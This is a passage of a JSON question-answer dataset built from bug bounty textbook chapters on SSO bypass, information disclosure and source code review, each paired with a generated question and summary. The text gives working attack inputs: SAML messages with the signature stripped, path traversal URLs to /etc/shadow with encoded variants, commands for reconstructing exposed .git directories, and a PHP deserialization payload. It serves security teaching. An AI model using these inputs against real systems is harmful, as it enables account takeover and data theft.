20\ncreated regularly. It can alert you only if the monitoring system detects\nsomething fishy:\n30 10 * * * cd /Users/vickie/scripts/security; ./subdomain_takeover.sh\nAfter the script notifies you of a potential subdomain takeover, you can\nverify the vulnerability by registering the page on the external service.\nHunting for SAML Vulnerabilities\nNow let’s discuss how you can find faulty SAML implementations and use\nthem to bypass your target’s SSO access controls. Before you dive in, be sure\nto confirm that the website is indeed using SAML. You can figure this out\nby intercepting the traffic used for authenticating to a site and looking for\nXML-like messages or the keyword saml. Note that SAML messages aren’t\nalways passed in plain XML format. They might be encoded in base64 or\nother encoding schemes.\nStep 1: Locate the SAML Response\nFirst and foremost, you need to locate the SAML response. You can usu-\nally do this by intercepting the requests going between the browser and\nthe service provider using a proxy. The SAML response will be sent when\nthe user’s browser is logging into a new session for that particular service\nprovider.\nStep 2: Analyze the Response Fields\nOnce you’ve located the SAML response, you can analyze its content to see\nwhich fields the service provider uses for determining the identity of the\nuser. Since the SAML response is used to relay authentication data to the\nservice provider, it must contain fields that communicate that information.\nFor example, look for field names like username, email address, userID, and\nso on. Try tampering with these fields in your proxy. If the SAML message\nlacks a signature, or if the signature of the SAML response isn’t verified\nat all, tampering with the message is all you need to do to authenticate as\nsomeone else!\nStep 3: Bypass the Signature\nIf the SAML message you’re tampering with does have a signature, you can\ntry a few strategies to bypass it.\nIf the signatures are verified only when they exist, you could try remov-\ning the signature value from the SAML response. Sometimes this is the only\nSingle-Sign-On Security Issues 319\naction required to bypass security checks. You can do this in two ways. First,\nyou can empty the signature field:\n<saml:Signature>\n<saml:SignatureValue>\n</saml:SignatureValue>\n</saml:Signature>\n<saml:AttributeStatement>\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nvictim_user\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nOr you can try removing the field entirely:\n<saml:AttributeStatement>\n<saml:Attribute Name=\"username\">\n<saml:AttributeValue>\nvictim_user\n</saml:AttributeValue>\n</saml:Attribute>\n</saml:AttributeStatement>\nIf the SAML response signature used by the application is predictable,\nlike the base64 example we discussed earlier, you can simply recalculate the\nsignature and forge a valid SAML response.\nStep 4: Re-encode the Message\nAfter tampering with the SAML response, re-encode the message into its\noriginal form and send it back to the service provider. The service provider\nwill use that information to authenticate you to the service. If you’re suc-\ncessful, you can obtain a valid session that belongs to the victim’s account.\nSAML Raider is a Burp Suite extension that can help you with editing and\nre-encoding SAML messages.\nHunting for OAuth Token Theft\nBefore you dive into hunting for OAuth open redirect issues, you should\nfirst determine whether the website is using OAuth. You can figure this out\nby intercepting the requests to complete authentication on the website and\nlook for the oauth keyword in the HTTP messages.\nThen start looking for open redirect vulnerabilities. You can find\ndetails on how to find open redirects in Chapter 7. Finally, see if you can\nsmuggle the OAuth tokens offsite by using one of the open redirects that\nyou’ve found.\n320 Chapter 20\nEscalating the Attack\nSSO bypass usually means that attackers can take over the accounts of oth-\ners. Therefore, these vulnerabilities are of high severity before any escalation\nattempts. But you can escalate SSO bypass vulnerabilities by attempting to\ntake over accounts with high privileges, such as admin accounts.\nAlso, after you’ve taken over the user’s account on one site, you can try\nto access the victim’s account on other sites by using the same OAuth cre-\ndentials. For instance, if you can leak an employee’s cookies via subdomain\ntakeover, see if you can access their company’s internal services such as\nadmin panels, business intelligence systems, and HR applications with\nthe same credentials.\nYou can also escalate account takeovers by writing a script to automate\nthe takeover of large numbers of accounts. Finally, you can try to leak data,\nexecute sensitive actions, or take over the application by using the accounts\nthat you have taken over. For example, if you can bypass the SSO on a bank-\ning site, can you read private information or transfer funds illegally? If you\ncan take over an admin account, can you change application settings or\nexecute scripts as the admin? Again, proceed with caution and never test\nanything unless you have obtained permission.\nFinding Your First SSO Bypass!\nNow that you are familiar with a few SSO bypass techniques, try to find your\nfirst SSO bypass bug:\n1. If the target application is using single sign-on, determine the SSO\nmechanism in use.\n2. If the application is using shared session cookies, try to steal session\ncookies by using subdomain takeovers.\n3. If the application uses a SAML-based SSO scheme, test whether the\nserver is verifying SAML signatures properly.\n4. If the application uses OAuth, try to steal OAuth tokens by using open\nredirects.\n5. Submit your report about SSO bypass to the bug bounty program!\nSingle-Sign-On Security Issues 321",
    "question": "What are the three main methods used to implement single sign-on (SSO) and what are the associated security vulnerabilities with each approach?",
    "summary": "Single sign-on (SSO) allows users to access multiple services without logging in repeatedly, offering convenience for both users and companies. However, SSO systems are vulnerable to attacks like subdomain takeovers, where attackers gain control of a subdomain to steal session cookies or launch phishing campaigns. Another vulnerability is in SAML implementations, where missing or weak signatures can allow attackers to forge identity assertions and impersonate users. OAuth is also susceptible to token theft via open redirects, which can lead to unauthorized access. Developers must ensure proper implementation of SSO mechanisms to prevent these security risks."
  },
  {
    "start": 224,
    "end": 231,
    "text": "21\nINFORMATION DISCLOSURE\nThe IDOR vulnerabilities covered in\nChapter 10 are a common way for appli-\ncations to leak private information about\nusers. But an attacker can uncover sensitive\ninformation from a target application in other ways\ntoo. I call these bugs information disclosure bugs. These\nbugs are common; in fact, they’re the type of bug I\nfind most often while bug bounty hunting, even when\nI’m searching for other bug types.\nThese bugs can happen in many ways, depending on the application. In\nthis chapter, we’ll talk about a few ways you might manage to leak data from\nan application, and how you can maximize the chances of finding an infor-\nmation disclosure yourself. This chapter delves into some of the techniques\nmentioned in Chapter 5, but with a focus on extracting sensitive and private\ninformation by using these techniques.\nMechanisms\nInformation disclosure occurs when an application fails to properly protect\nsensitive information, giving users access to information they shouldn’t have\navailable to them. This sensitive information can include technical details\nthat aid an attack, like software version numbers, internal IP addresses, sen-\nsitive filenames, and filepaths. It could also include source code that allows\nattackers to conduct a source code review on the application. Still other\ntimes, the application leaks private information of users, like a user’s age,\nbank account numbers, email addresses, and mailing addresses, to unau-\nthorized third parties.\nMost systems aim to hide development information, including software\nversion numbers and configuration files, from the outside world, because it\nallows attackers to gather information about an application and strategize\nabout how to most effectively attack it. For example, learning the exact\nsoftware versions an application uses will allow attackers to look for publicly\ndisclosed vulnerabilities that affect the application. Configuration files\noften contain information such as access tokens and internal IP addresses\nthat attackers can use to further compromise the organization.\nTypically, applications leak version numbers in HTTP response head-\ners, HTTP response bodies, or other server responses. For example, the\nX-Powered-By header, which is used by many applications, shows you which\nframework the application runs:\nX-Powered-By: PHP/5.2.17\nOn the other hand, applications leak sensitive configuration files by not\napplying proper access control to the files, or by accidentally uploading a\nsensitive file onto a public repository that outside users can access.\nAnother piece of information that applications should protect is their\nsource code. When the backend code of an application is leaked to the\npublic, the leaked code can help attackers understand the application’s\nlogic, as well as search for logic flaw vulnerabilities, hardcoded credentials,\nor information about the company’s infrastructure, such as internal IPs.\nApplications can leak source code by accidentally publishing a private code\nrepository, by sharing code snippets on public GitHub or GitLab reposito-\nries, or by uploading it to third-party sites like Pastebin.\nFinally, applications often leak sensitive information by including it in\ntheir public code. Developers might accidentally place information such as\ncredentials, internal IP addresses, informative code comments, and users’\nprivate information in public source code such as the HTML and JavaScript\nfiles that get served to users.\nPrevention\nIt’s difficult to completely prevent sensitive information leaks. But you can\nreliably lower the possibilities of information disclosure by safeguarding\nyour data during the development process.\n324 Chapter 21\nThe most important measure you should take is to avoid hardcoding\ncredentials and other sensitive information into executable code. Instead,\nyou can place sensitive information in separate configuration files or a\nsecret storage system like Vault (https://github.com/hashicorp/vault/). Also,\naudit your public code repositories periodically to make sure sensitive files\nhaven’t been uploaded by accident. Tools can help you monitor code for\nsecrets, such as secret-bridge (https://github.com/duo-labs/secret-bridge/). And\nif you have to upload sensitive files to the production server, apply granular\naccess control to restricts users’ access to the files.\nNext, remove data from services and server responses that reveals tech-\nnical details about the backend server setup and software versions. Handle\nall exceptions by returning a generic error page to the user, instead of a\ntechnical page that reveals details about the error.\nHunting for Information Disclosure\nYou can use several strategies to find information disclosure vulnerabilities,\ndepending on the application you’re targeting and what you’re looking for.\nA good starting point is to look for software version numbers and configu-\nration information by using the recon techniques introduced in Chapter 5.\nThen you can start to look for exposed configuration files, database files,\nand other sensitive files uploaded to the production server that aren’t pro-\ntected. The following steps discuss some techniques you can attempt.\nStep 1: Attempt a Path Traversal Attack\nStart by trying a path traversal attack to read the server’s sensitive files.\nPath traversal attacks are used to access files outside the web application’s\nroot folder. This process involves manipulating filepath variables the appli-\ncation uses to reference files by adding the ../ characters to them. This\nsequence refers to the parent directory of the current directory in Unix\nsystems, so by adding it to a filepath, you can often reach files outside the\nweb root.\nFor example, let’s say a website allows you to load an image in the appli-\ncation’s image folder by using a relative URL. An absolute URL contains an\nentire address, from the URL protocol to the domain name and pathnames\nof the resource. Relative URLs, on the other hand, contain only a part of the\nfull URL. Most contain only the path or filename of the resource. Relative\nURLs are used to link to another location on the same domain.\nThis URL, for example, will redirect users to https://example.com/images/\n1.png:\nhttps://example.com/image?url=/images/1.png\nIn this case, the url parameter contains a relative URL (/images/1.png)\nthat references files within the web application root. You can insert the ../\nsequence to try to navigate out of the images folder and out of the web root.\nInformation Disclosure 325\nFor instance, the following URL refers to the index.html file at the web appli-\ncation’s root folder (and out of the images folder):\nhttps://example.com/image?url=/images/../index.html\nSimilarly, this one will access the /etc/shadow file at the server’s root\ndirectory, which is a file that stores a list of the system’s user accounts and\ntheir encrypted passwords:\nhttps://example.com/image?url=/images/../../../../../../../etc/shadow\nIt might take some trial and error to determine how many ../ sequences\nyou need to reach the system’s root directory. Also, if the application imple-\nments some sort of input validation and doesn’t allow ../ in the filepath,\nyou can use encoded variations of ../, such as %2e%2e%2f (URL encoding),\n%252e%252e%255f (double URL encoding), and ..%2f (partial URL encoding).\nStep 2: Search the Wayback Machine\nAnother way to find exposed files is by using the Wayback Machine. Introduced\nin Chapter 5, the Wayback Machine is an online archive of what websites\nlooked like at various points in time. You can use it to find hidden and dep-\nrecated endpoints, as well as large numbers of current endpoints without\nactively crawling the site, making it a good first look into what the applica-\ntion might be exposing.\nOn the Wayback Machine’s site, simply search for a domain to see its\npast versions. To search for a domain’s files, visit https://web.archive.org/web/*/\nDOMAIN.\nAdd a /* to this URL to get the archived URLs related to the domain as\na list. For example, https://web.archive.org/web/*/example.com/* will return a list\nof URLs related to example.com. You should see the URLs displayed on the\nWayback Machine web page (Figure 21-1).\nFigure 21-1: You can list the archived URLs of a domain on the Wayback Machine.\n326 Chapter 21\nYou can then use the search function to see whether any sensitive pages\nhave been archived. For example, to look for admin pages, search for the\nterm /admin in the found URLs (Figure 21-2).\nFigure 21-2: Search for keywords in the URLs to find potentially sensitive pages.\nYou can also search for backup files and configuration files by using\ncommon file extensions like .conf (Figure 21-3) and .env, or look for source\ncode, like JavaScript or PHP files, by using the file extensions .js and .php.\nFigure 21-3: Filter the URLs by file extension to find files of a certain type.\nDownload interesting archived pages and look for any sensitive info. For\nexample, are there any hardcoded credentials that are still in use, or does the\npage leak any hidden endpoints that normal users shouldn’t know about?\nStep 3: Search Paste Dump Sites\nNext, look into paste dump sites like Pastebin and GitHub gists. These let\nusers share text documents via a direct link rather than via email or services\nlike Google Docs, so developers often use them to send source code, configu-\nration files, and log files to their coworkers. But on a site like Pastebin, for\nexample, shared text files are public by default. If developers upload a sensi-\ntive file, everyone will be able to read it. For this reason, these code-sharing\nsites are pretty infamous for leaking credentials like API keys and passwords.\nInformation Disclosure 327\nPastebin has an API that allows users to search for public paste files by\nusing a keyword, email, or domain name. You can use this API to find sensi-\ntive files that belong to a certain organization. Tools like PasteHunter or\npastebin-scraper can also automate the process. Pastebin-scraper (https://\ngithub.com/streaak/pastebin-scraper/) uses the Pastebin API to help you search\nfor paste files. This tool is a shell script, so download it to a local directory\nand run the following command to search for public paste files associated\nwith a particular keyword. The -g option indicates a general keyword search:\n./scrape.sh -g KEYWORD\nThis command will return a list of Pastebin file IDs associated with\nthe specified KEYWORD. You can access the returned paste files by going to\npastebin.com/ID.\nStep 4: Reconstruct Source Code from an Exposed .git Directory\nAnother way of finding sensitive files is to reconstruct source code from an\nexposed .git directory. When attacking an application, obtaining its source\ncode can be extremely helpful for constructing an exploit. This is because\nsome bugs, like SQL injections, are way easier to find through static code\nanalysis than black-box testing. Chapter 22 covers how to review code for\nvulnerabilities.\nWhen a developer uses Git to version-control a project’s source code,\nGit will store all of the project’s version-control information, including the\ncommit history of project files, in a Git directory. Normally, this .git folder\nshouldn’t be accessible to the public, but sometimes it’s accidentally made\navailable. This is when information leaks happen. When a .git directory\nis exposed, attackers can obtain an application’s source code and there-\nfore gain access to developer comments, hardcoded API keys, and other\nsensitive data via secret scanning tools like truffleHog (https://github.com/\ndxa4481/truffleHog/) or Gitleaks (https://github.com/zricethezav/gitleaks/).\nChecking Whether a .git Folder Is Public\nTo check whether an application’s .git folder is public, simply go to the appli-\ncation’s root directory (for example, example.com) and add /.git to the URL:\nhttps://example.com/.git\nThree things could happen when you browse to the /.git directory. If you\nget a 404 error, this means the application’s .git directory isn’t made available\nto the public, and you won’t be able to leak information this way. If you get a\n403 error, the .git directory is available on the server, but you won’t be able to\ndirectly access the folder’s root, and therefore won’t be able to list all the files\ncontained in the directory. If you don’t get an error and the server responds\nwith the directory listing of the .git directory, you can directly browse the\nfolder’s contents and retrieve any information contained in it.\n328 Chapter 21\nDownloading Files\nIf directory listing is enabled, you can browse through the files and retrieve\nthe leaked information. The wget command retrieves content from web\nservers. You can use wget in recursive mode (-r) to mass-download all files\nstored within the specified directory and its subdirectories:\n$ wget -r example.com/.git\nBut if directory listing isn’t enabled and the directory’s files are not\nshown, you can still reconstruct the entire .git directory. First, you’ll need to\nconfirm that the folder’s contents are indeed available to the public. You can\ndo this by trying to access the directory’s config file:\n$ curl https://example.com/.git/config\nIf this file is accessible, you might be able to download the Git direc-\ntory’s entire contents so long as you understand the general structure of .git\ndirectories. A .git directory is laid out in a specific way. When you execute\nthe following command in a Git repository, you should see contents resem-\nbling the following:\n$ ls .git\nCOMMIT_EDITMSG HEAD branches config description hooks index info logs objects refs\nThe output shown here lists a few standard files and folders that are\nimportant for reconstructing the project’s source. In particular, the\n/objects directory is used to store Git objects. This directory contains addi-\ntional folders; each has two character names corresponding to the first two\ncharacters of the SHA1 hash of the Git objects stored in it. Within these\nsubdirectories, you’ll find files named after the rest of the SHA1 hash of\nthe Git object stored in it. In other words, the Git object with a hash of\n0a082f2656a655c8b0a87956c7bcdc93dfda23f8 will be stored with the filename of\n082f2656a655c8b0a87956c7bcdc93dfda23f8 in the directory .git/objects/0a. For\nexample, the following command will return a list of folders:\n$ ls .git/objects\n00 0a 14 5a 64 6e 82 8c 96 a0 aa b4 be c8 d2 dc e6 f0 fa info pack\nAnd this command will reveal the Git objects stored in a particular\nfolder:\n$ ls .git/objects/0a\n082f2656a655c8b0a87956c7bcdc93dfda23f8 4a1ee2f3a3d406411a72e1bea63507560092bd 66452433322af3d3\n19a377415a890c70bbd263 8c20ea4482c6d2b0c9cdaf73d4b05c2c8c44e9 ee44c60c73c5a622bb1733338d3fa964\nb333f0\n0ec99d617a7b78c5466daa1e6317cbd8ee07cc 52113e4f248648117bc4511da04dd4634e6753\n72e6850ef963c6aeee4121d38cf9de773865d8\nInformation Disclosure 329\nGit stores different types of objects in .git/objects: commits, trees, blobs, and\nannotated tags. You can determine an object’s type by using this command:\n$ git cat-file -t OBJECT-HASH\nCommit objects store information such as the commit’s tree object hash,\nparent commit, author, committer, date, and message of a commit. Tree objects\ncontain the directory listings for commits. Blob objects contain copies of files\nthat were committed (read: actual source code!). Finally, tag objects contain\ninformation about tagged objects and their associated tag names. You can dis-\nplay the file associated with a Git object by using the following command:\n$ git cat-file -p OBJECT-HASH\nThe /config file is the Git configuration file for the project, and the\n/HEAD file contains a reference to the current branch:\n$ cat .git/HEAD\nref: refs/heads/master\nIf you can’t access the /.git folder’s directory listing, you have to download\neach file you want instead of recursively downloading from the directory\nroot. But how do you find out which files on the server are available when\nobject files have complex paths, such as .git/objects/0a/72e6850ef963c6aeee4121d\n38cf9de773865d8?\nYou start with filepaths that you already know exist, like .git/HEAD!\nReading this file will give you a reference to the current branch (for example,\n.git/refs/heads/master) that you can use to find more files on the system:\n$ cat .git/HEAD\nref: refs/heads/master\n$ cat .git/refs/heads/master\n0a66452433322af3d319a377415a890c70bbd263\n$ git cat-file -t 0a66452433322af3d319a377415a890c70bbd263\ncommit\n$ git cat-file -p 0a66452433322af3d319a377415a890c70bbd263\ntree 0a72e6850ef963c6aeee4121d38cf9de773865d8\nThe .git/refs/heads/master file will point you to the particular object\nhash that stores the directory tree of the commit. From there, you\ncan see that the object is a commit and is associated with a tree object,\n0a72e6850ef963c6aeee4121d38cf9de773865d8. Now examine that tree object:\n$ git cat-file -p 0a72e6850ef963c6aeee4121d38cf9de773865d8\n100644 blob 6ad5fb6b9a351a77c396b5f1163cc3b0abcde895 .gitignore\n040000 blob 4b66088945aab8b967da07ddd8d3cf8c47a3f53c source.py\n040000 blob 9a3227dca45b3977423bb1296bbc312316c2aa0d README\n040000 tree 3b1127d12ee43977423bb1296b8900a316c2ee32 resources\nBingo! You discover some source code files and additional object trees\nto explore.\n330 Chapter 21\nOn a remote server, your requests to discover the different files would\nlook a little different. For instance, you can use this URL to determine the\nHEAD:\nhttps://example.com/.git/HEAD\nUse this URL to find the object stored in that HEAD:\nhttps://example.com/.git/refs/heads/master\nUse this URL to access the tree associated with the commit:\nhttps://example.com/.git/objects/0a/72e6850ef963c6aeee4121d38cf9de773865d8\nFinally, use this URL to download the source code stored in the\nsource.py file:\nhttps://example.com/.git/objects/4b/66088945aab8b967da07ddd8d3cf8c47a3f53c\nIf you are downloading files from a remote server, you’ll also need to\ndecompress the downloaded object file before you read it. This can be done\nusing some code. You can decompress the object file by using Ruby, Python,\nor your preferred language’s zlib library:\nruby -rzlib -e 'print Zlib::Inflate.new.inflate(STDIN.read)' < OBJECT_FILE\npython -c 'import zlib, sys;\nprint repr(zlib.decompress(sys.stdin.read()))' < OBJECT_FILE\nAfter recovering the project’s source code, you can grep for sensitive data\nsuch as hardcoded credentials, encryption keys, and developer comments.\nIf you have time, you can browse through the entire recovered codebase to\nconduct a source code review and find potential vulnerabilities.\nStep 5: Find Information in Public Files\nYou could also try to find information leaks in the application’s public\nfiles, such as their HTML and JavaScript source code. In my experience,\nJavaScript files are a rich source of information leaks!\nBrowse the web application that you’re targeting as a regular user and\ntake note of where the application displays or uses your personal informa-\ntion. Then right-click those pages and click View page source. You should\nsee the HTML source code of the current page. Follow the links on this\npage to find other HTML files and JavaScript files the application is using.\nThen, on the HTML file and the JavaScript files found, grep every page for\nhardcoded credentials, API keys, and personal information with keywords\nlike password and api_key.\nYou can also locate JavaScript files on a site by using tools like LinkFinder\n(https://github.com/GerbenJavado/LinkFinder/).\nInformation Disclosure 331\nEscalating the Attack\nAfter you’ve found a sensitive file or a piece of sensitive data, you’ll have to\ndetermine its impact before reporting it. For example, if you have found\ncredentials such as a password or an API key, you need to validate that\nthey’re currently in use by accessing the target’s system with them. I often\nfind outdated credentials that cannot be used to access anything. In that\ncase, the information leak isn’t a vulnerability.\nIf the sensitive files or credentials you’ve found are valid and current,\nconsider how you can compromise the application’s security with them.\nFor example, if you found a GitHub access token, you can potentially mess\nwith the organization’s projects and access their private repositories. If you\nfind the password to their admin portals, you might be able to leak their\ncustomers’ private information. And if you can access the /etc/shadow file on\na target server, you might be able to crack the system user’s passwords and\ntake over the system! Reporting an information leak is often about commu-\nnicating the impact of that leak to companies by highlighting the criticality\nof the leaked information.\nIf the impact of the information you found isn’t particularly critical,\nyou can explore ways to escalate the vulnerability by chaining it with other\nsecurity issues. For example, if you can leak internal IP addresses within\nthe target’s network, you can use them to pivot into the network during an\nSSRF exploit. Alternatively, if you can pinpoint the exact software version\nnumbers the application is running, see if any CVEs are related to the soft-\nware version that can help you achieve RCE.\nFinding Your First Information Disclosure!\nNow that you understand the common types of information leaks and how\nto find them, follow the steps discussed in this chapter to find your first\ninformation disclosure:\n1. Look for software version numbers and configuration information by\nusing the recon techniques presented in Chapter 5.\n2. Start searching for exposed configuration files, database files, and other\nsensitive files uploaded to the production server that aren’t protected\nproperly. Techniques you can use include path traversal, scraping the\nWayback Machine or paste dump sites, and looking for files in exposed\n.git directories.\n3. Find information in the application’s public files, such as its HTML and\nJavaScript source code, by grepping the file with keywords.\n4. Consider the impact of the information you find before reporting it,\nand explore ways to escalate its impact.\n5. Draft your first information disclosure report and send it over to the\nbug bounty program!\n332 Chapter 21",
    "question": "What are the common methods for identifying information disclosure vulnerabilities in applications and how can they be exploited to reveal sensitive data?",
    "summary": "Information disclosure vulnerabilities occur when applications improperly expose sensitive data like software versions, configuration files, or user information. These bugs are common and can be found through various methods such as path traversal, checking the Wayback Machine, searching paste sites, and examining exposed .git directories. To prevent such leaks, developers should avoid hardcoding sensitive information and implement proper access controls."
  },
  {
    "start": 232,
    "end": 253,
    "text": "22\nCONDUCTING CODE RE VIE WS\nYou’ll sometimes come across the source\ncode of an application you’re attacking.\nFor example, you might be able to extract\nJavaScript code from a web application, find\nscripts stored on servers during the recon process, or\nobtain Java source code from an Android application.\nIf so, you are in luck! Reviewing code is one of the\nbest ways to find vulnerabilities in applications.\nInstead of testing applications by trying different payloads and attacks,\nyou can locate insecure programming directly by looking for bugs in an\napplication’s source code. Source code review not only is a faster way of\nfinding vulnerabilities, but also helps you learn how to program safely in\nthe future, because you’ll observe the mistakes of others.\nBy learning how vulnerabilities manifest themselves in source code,\nyou can develop an intuition about how and why vulnerabilities happen.\nLearning to conduct source code reviews will eventually help you become\na better hacker.\nThis chapter introduces strategies that will help you get started review-\ning code. We’ll cover what you should look for and walk through example\nexercises to get your feet wet.\nRemember that, most of the time, you don’t have to be a master pro-\ngrammer to conduct a code review in a particular language. As long as you\nunderstand one programming language, you can apply your intuition to\nreview a wide variety of software written in different languages. But under-\nstanding the target’s particular language and architecture will allow you to\nspot more nuanced bugs.\nNOTE If you are interested in learning more about code reviews beyond the strategies mentioned\nin this chapter, the OWASP Code Review Guide (https://owasp.org/www-project\n-code-review-guide/) is a comprehensive resource to reference.\nWhite-Box vs. Black-Box Testing\nYou might have heard people in the cybersecurity industry mention black-\nbox and white-box testing. Black-box testing is testing the software from the\noutside in. Like a real-life attacker, these testers have little understanding of\nthe application’s internal logic. In contrast, in gray-box testing, the tester has\nlimited knowledge of the application’s internals. In a white-box review, the\ntester gets full access to the software’s source code and documentation.\nUsually, bug bounty hunting is a black-box process, since you don’t\nhave access to an application’s source code. But if you can identify the open\nsource components of the application or find its source code, you can convert\nyour hunting to a more advantageous gray-box or white-box test.\nThe Fast Approach: grep Is Your Best Friend\nThere are several ways to go about hunting for vulnerabilities in source\ncode, depending on how thorough you want to be. We’ll begin with what\nI call the “I’ll take what I can get” strategy. It works great if you want to\nmaximize the number of bugs found in a short time. These techniques are\nspeedy and often lead to the discovery of some of the most severe vulner-\nabilities, but they tend to leave out the more subtle bugs.\nDangerous Patterns\nUsing the grep command, look for specific functions, strings, keywords,\nand coding patterns that are known to be dangerous. For example, the\nuse of the eval() function in PHP can indicate a possible code injection\nvulnerability.\nTo see how, imagine you search for eval() and pull up the following\ncode snippet:\n<?php\n[...]\nclass UserFunction\n336 Chapter 22\n{\nprivate $hook;\nfunction __construct(){\n[...]\n}\nfunction __wakeup(){\n1 if (isset($this->hook)) eval($this->hook);\n}\n}\n[...]\n2 $user_data = unserialize($_COOKIE['data']);\n[...]\n?>\nIn this example, $_COOKIE['data'] 2 retrieves a user cookie named data.\nThe eval() function 1 executes the PHP code represented by the string\npassed in. Put together, this piece of code takes a user cookie named data\nand unserializes it. The application also defines a class named UserFunction,\nwhich runs eval() on the string stored in the instance’s $hook property\nwhen unserialized.\nThis code contains an insecure deserialization vulnerability, leading\nto an RCE. That’s because the application takes user input from a user’s\ncookie and plugs it directly into an unserialize() function. As a result, users\ncan make unserialize() initiate any class the application has access to by\nconstructing a serialized object and passing it into the data cookie.\nYou can achieve RCE by using this deserialization flaw because it passes\na user-provided object into unserialize(), and the UserFunction class runs\neval() on user-provided input, which means users can make the applica-\ntion execute arbitrary user code. To exploit this RCE, you simply have to set\nyour data cookie to a serialized UserFunction object with the hook property set\nto whatever PHP code you want. You can generate the serialized object by\nusing the following bit of code:\n<?php\nclass UserFunction\n{\nprivate $hook = \"phpinfo();\";\n}\nprint urlencode(serialize(new UserFunction));\n?>\nPassing the resulting string into the data cookie will cause the code\nphpinfo(); to be executed. This example is taken from OWASP’s PHP object\ninjection guide at https://owasp.org/www-community/vulnerabilities/PHP_Object\n_Injection. You can learn more about insecure deserialization vulnerabilities\nin Chapter 14.\nWhen you are just starting out reviewing a piece of source code,\nfocus on the search for dangerous functions used on user-controlled\nConducting Code Reviews 337\ndata. Table 22-1 lists a few examples of dangerous functions to look out\nfor. The presence of these functions does not guarantee a vulnerability,\nbut can alert you to possible vulnerabilities.\nTable 22-1: Potentially Vulnerable Functions\nLanguage Function Possible vulnerability\nPHP eval(), assert(), system(), RCE if used on unsanitized user input .\nexec(), shell_exec(), eval() and assert() execute PHP code in\npassthru(), popen(), back- its input, while system(), exec(), shell_\nticks (`CODE`), include(), exec(), passthru(), popen(), and back-\nrequire() ticks execute system commands . include()\nand require() can be used to execute PHP\ncode by feeding the function a URL to a\nremote PHP script .\nPHP unserialize() Insecure deserialization if used on unsani-\ntized user input .\nPython eval(), exec(), RCE if used on unsanitized user input .\nos.system()\nPython pickle.loads(), Insecure deserialization if used on unsani-\nyaml.load() tized user input .\nJavaScript document.write(), XSS if used on unsanitized user input .\ndocument.writeln These functions write to the HTML docu-\nment . So if attackers can control the value\npassed into it on a victim’s page, the\nattacker can write JavaScript onto a vic-\ntim’s page .\nJavaScript document.location.href() Open redirect when used on unsanitized\nuser input . document.location.href()\nchanges the location of the user’s page .\nRuby System(), exec(), %x(), RCE if used on unsanitized user input .\nbackticks (`CODE`)\nRuby Marshall.load(), Insecure deserialization if used on unsani-\nyaml.load() tized user input .\nLeaked Secrets and Weak Encryption\nLook for leaked secrets and credentials. Sometimes developers make the\nmistake of hardcoding secrets such as API keys, encryption keys, and data-\nbase passwords into source code. When that source code is leaked to an\nattacker, the attacker can use these credentials to access the company’s\nassets. For example, I’ve found hardcoded API keys in the JavaScript files of\nweb applications.\nYou can look for these issues by grepping for keywords such as key,\nsecret, password, encrypt, API, login, or token. You can also regex search for\nhex or base64 strings, depending on the key format of the credentials\nyou’re looking for. For instance, GitHub access tokens are lowercase,\n40-character hex strings. A search pattern like [a-f0-9]{40} would find them\nin the source code. This search pattern matches strings that are 40 characters\nlong and contains only digits and the hex letters a to f.\n338 Chapter 22\nWhen searching, you might pull up a section of code like this one, writ-\nten in Python:\nimport requests\n1 GITHUB_ACCESS_TOKEN = \"0518fb3b4f52a1494576eee7ed7c75ae8948ce70\"\nheaders = {\"Authorization\": \"token {}\".format(GITHUB_ACCESS_TOKEN), \\\n\"Accept\": \"application/vnd.github.v3+json\"}\napi_host = \"https://api.github.com\"\n2 usernames = [\"vickie\"] # List users to analyze\ndef request_page(path):\nresp = requests.Response()\ntry: resp = requests.get(url=path, headers=headers, timeout=15,\nverify=False)\nexcept: pass\nreturn resp.json()\n3 def find_repos():\n# Find repositories owned by the users.\nfor username in usernames:\npath = \"{}/users/{}/repos\".format(api_host, username)\nresp = request_page(path)\nfor repo in resp:\nprint(repo[\"name\"])\nif __name__ == \"__main__\":\nfind_repos()\nThis Python program takes in the username of a user from GitHub 2\nand prints out the names of all the user’s repositories 3. This is probably\nan internal script used to monitor the organization’s assets. But this code\ncontains a hardcoded credential, as the developer hardcoded a GitHub\naccess token into the source code 1. Once the source code is leaked, the\nAPI key becomes public information.\nEntropy scanning can help you find secrets that don’t adhere to a spe-\ncific format. In computing, entropy is a measurement of how random and\nunpredictable something is. For instance, a string composed of only one\nrepeated character, like aaaaa, has very low entropy. A longer string with a\nlarger set of characters, like wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY, has\nhigher entropy. Entropy is therefore a good tool to find highly randomized\nand complex strings, which often indicate a secret. TruffleHog by Dylan\nAyrey (https://github.com/trufflesecurity/truffleHog/) is a tool that searches\nfor secrets by using both regex and entropy scanning.\nFinally, look for the use of weak cryptography or hashing algorithms.\nThis issue is hard to find during black-box testing but easy to spot when\nreviewing source code. Look for issues such as weak encryption keys, break-\nable encryption algorithms, and weak hashing algorithms. Grep the names\nof weak algorithms like ECB, MD4, and MD5. The application might have\nfunctions named after these algorithms, such as ecb(), create_md4(), or\nConducting Code Reviews 339\nmd5_hash(). It might also have variables with the name of the algorithm, like\necb_key, and so on. The impact of weak hashing algorithms depends on\nwhere they are used. If they are used to hash values that are not considered\nsecurity sensitive, their usage will have less of an impact than if they are\nused to hash passwords.\nNew Patches and Outdated Dependencies\nIf you have access to the commit or change history of the source code, you\ncan also focus your attention on the most recent code fixes and security\npatches. Recent changes haven’t stood the test of time and are more likely\nto contain bugs. Look at the protection mechanisms implemented and see\nif you can bypass them.\nAlso search for the program’s dependencies and check whether any of\nthem are outdated. Grep for specific code import functions in the language\nyou are using with keywords like import, require, and dependencies. Then\nresearch the versions they’re using to see if any vulnerabilities are associ-\nated with them in the CVE database (https://cve.mitre.org/). The process\nof scanning an application for vulnerable dependencies is called software\ncomposition analysis (SCA). The OWASP Dependency-Check tool (https://\nowasp.org/www-project-dependency-check/) can help you automate this process.\nCommercial tools with more capabilities exist too.\nDeveloper Comments\nYou should also look for developer comments and hidden debug function-\nalities, and accidentally exposed configuration files. These are resources\nthat developers often forget about, and they leave the application in a dan-\ngerous state.\nDeveloper comments can point out obvious programming mistakes.\nFor example, some developers like to put comments in their code to remind\nthemselves of incomplete tasks. They might write comments like this, which\npoints out vulnerabilities in the code:\n# todo: Implement CSRF protection on the change_password endpoint.\nYou can find developer comments by searching for the comment char-\nacters of each programming language. In Python, it’s #. In Java, JavaScript,\nand C++, it’s //. You can also search for terms like todo, fix, completed, 